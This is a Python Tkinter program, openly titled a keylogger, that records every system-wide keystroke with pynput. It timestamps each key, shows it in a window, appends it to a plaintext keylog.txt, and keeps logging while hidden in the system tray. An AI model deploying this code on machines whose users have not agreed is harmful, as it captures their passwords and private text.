import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from pynput import keyboard
import os
from datetime import datetime
import threading
import pystray
from PIL import Image, ImageDraw

class RealTimeKeyVisualizer:
    def __init__(self, root):
        self.root = root
        self.root.title("🔍 Keylogger Software")
        self.root.geometry("600x400")
        self.root.configure(bg='#1e1e2f')

        # Graceful exit on window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        # Log file path
        self.log_file = os.path.join(os.path.dirname(__file__), "keylog.txt")

        # Logging state
        self.logging_active = True

        # Text box for output
        self.text_box = tk.Text(
            root,
            bg='#2e2e3e',
            fg='lime',
            font=('Consolas', 12),
            wrap=tk.WORD
        )
        self.text_box.pack(expand=True, fill='both', padx=10, pady=10)
        self.text_box.insert(tk.END, "[INFO] Press keys on your keyboard... (ESC to stop)\n")
        self.text_box.config(state='disabled')

        # Button frame
        btn_frame = tk.Frame(root, bg='#1e1e2f')
        btn_frame.pack(fill='x', padx=10, pady=(0, 10))

        save_btn = tk.Button(btn_frame, text="Save Log", command=self.save_log)
        save_btn.pack(side='left', padx=5, expand=True, fill='x')
        clear_btn = tk.Button(btn_frame, text="Clear Log", command=self.clear_log)
        clear_btn.pack(side='left', padx=5, expand=True, fill='x')
        pause_btn = tk.Button(btn_frame, text="Pause Logging", command=self.toggle_logging)
        pause_btn.pack(side='left', padx=5, expand=True, fill='x')
        search_btn = tk.Button(btn_frame, text="Search", command=self.search_log)
        search_btn.pack(side='left', padx=5, expand=True, fill='x')

        self.pause_btn = pause_btn  # Reference for changing text

        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Status: Logging...")
        status_bar = tk.Label(root, textvariable=self.status_var, bd=1, relief=tk.SUNKEN, anchor='w', bg='#23233a', fg='white')
        status_bar.pack(side='bottom', fill='x')

        # System tray icon setup
        self.tray_icon = None
        self.is_tray = False
        self.root.bind("<Unmap>", self.on_minimize)

        self.start_listener()

    def log_key(self, key):
        if not self.logging_active:
            return

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            msg = f"[{timestamp}] Key: {key.char}\n"
            tag = 'normal'
        except AttributeError:
            msg = f"[{timestamp}] Special Key: {key}\n"
            tag = 'special'

        # Write to GUI with color tags
        self.text_box.config(state='normal')
        self.text_box.insert(tk.END, msg, tag)
        self.text_box.see(tk.END)
        self.text_box.config(state='disabled')

        # Tag configuration (do this once, but safe to repeat)
        self.text_box.tag_config('normal', foreground='lime')
        self.text_box.tag_config('special', foreground='orange')

        # Write to file
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(msg)

    def on_press(self, key):
        self.log_key(key)
        if key == keyboard.Key.esc:
            self.status_var.set("Status: Logging stopped by ESC. Exiting...")
            self.listener.stop()
            self.root.after(1000, self.root.quit)

    def start_listener(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.status_var.set("Status: Logging...")

    def save_log(self):
        self.text_box.config(state='normal')
        log_content = self.text_box.get("1.0", tk.END)
        self.text_box.config(state='disabled')
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if file_path:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(log_content)
            messagebox.showinfo("Saved", "Log saved successfully.")
            self.status_var.set("Status: Log saved.")

    def clear_log(self):
        self.text_box.config(state='normal')
        self.text_box.delete("1.0", tk.END)
        self.text_box.insert(tk.END, "[INFO] Log cleared. Press keys on your keyboard... (ESC to stop)\n")
        self.text_box.config(state='disabled')
        # Clear the log file as well
        with open(self.log_file, "w", encoding="utf-8") as f:
            f.write("[INFO] Log cleared. Press keys on your keyboard... (ESC to stop)\n")
        self.status_var.set("Status: Log cleared.")

    def toggle_logging(self):
        self.logging_active = not self.logging_active
        if self.logging_active:
            self.status_var.set("Status: Logging resumed.")
            self.pause_btn.config(text="Pause Logging")
        else:
            self.status_var.set("Status: Logging paused.")
            self.pause_btn.config(text="Resume Logging")

    def search_log(self):
        search_term = simpledialog.askstring("Search Log", "Enter text to search:")
        if not search_term:
            return
        self.text_box.tag_remove('search', '1.0', tk.END)
        idx = '1.0'
        found = False
        while True:
            idx = self.text_box.search(search_term, idx, nocase=1, stopindex=tk.END)
            if not idx:
                break
            lastidx = f"{idx}+{len(search_term)}c"
            self.text_box.tag_add('search', idx, lastidx)
            idx = lastidx
            found = True
        self.text_box.tag_config('search', background='yellow', foreground='black')
        if found:
            self.status_var.set(f"Status: Found '{search_term}' in log.")
        else:
            self.status_var.set(f"Status: '{search_term}' not found in log.")

    def on_minimize(self, event):
        if self.root.state() == 'iconic':
            self.hide_window()
            self.show_tray_icon()

    def hide_window(self):
        self.root.withdraw()
        self.is_tray = True

    def show_window(self, icon=None, item=None):
        self.root.deiconify()
        self.is_tray = False
        if self.tray_icon:
            self.tray_icon.stop()

    def show_tray_icon(self):
        # Create a simple icon
        image = Image.new('RGB', (64, 64), color='black')
        d = ImageDraw.Draw(image)
        d.ellipse((16, 16, 48, 48), fill='lime')
        menu = (pystray.MenuItem('Show', self.show_window), pystray.MenuItem('Exit', self.on_tray_exit))
        self.tray_icon = pystray.Icon("Keylogger", image, "Keylogger Software", menu)
        threading.Thread(target=self.tray_icon.run, daemon=True).start()

    def on_tray_exit(self, icon=None, item=None):
        if self.tray_icon:
            self.tray_icon.stop()
        self.root.after(0, self.root.destroy)

    def on_close(self):
        if self.is_tray and self.tray_icon:
            self.tray_icon.stop()
        self.status_var.set("Status: Exiting...")
        try:
            self.listener.stop()
        except Exception:
            pass
        self.root.after(500, self.root.destroy)

if __name__ == "__main__":
    root = tk.Tk()
    app = RealTimeKeyVisualizer(root)
    root.mainloop()